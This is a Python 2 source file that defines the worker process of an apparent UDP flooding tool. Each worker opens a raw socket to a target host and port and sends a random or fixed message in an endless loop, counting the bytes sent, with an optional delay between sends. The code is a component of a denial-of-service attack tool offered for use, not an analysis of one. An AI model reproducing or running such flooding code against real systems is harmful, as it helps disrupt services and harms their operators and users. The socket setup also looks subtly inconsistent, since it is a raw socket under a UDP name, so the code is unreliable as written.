import socket, time
from Functions import *
from multiprocessing import Process

class UDPWorkerThread(Process):

    def __init__(self, flooder, id):
        Process.__init__(self)
        self.id = id
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_RAW)

        self.flooder = flooder
        self.running = True
        self.byteCount = 0

        if flooder.random:
            self.message = randomString(256)
        else:
            self.message = self.flooder.message

    def stop(self):
        self.running = False
        try:
            self.flooder.byteCount.put(self.byteCount, True, 5)
        except:
            pass

    def run(self):
        try:
            try:
	            self.socket.connect((self.flooder.host, self.flooder.port))
	            print "thread", self.id, "connected"
            except Exception as e:
	            print "Couldn't connect:", e.args, self.flooder.host, self.flooder.port
	            return

            while self.running:
                try:
                    bytes = self.socket.send(self.message)
                    self.byteCount += bytes
                    if self.flooder.wait != None and self.flooder.wait != False:
                        time.sleep(self.flooder.wait)
                except Exception as e:
                    print "Couldn't send message on thread", self.id, "because", e.args
                    time.sleep(0.1)
                    pass
        except KeyboardInterrupt:
            return
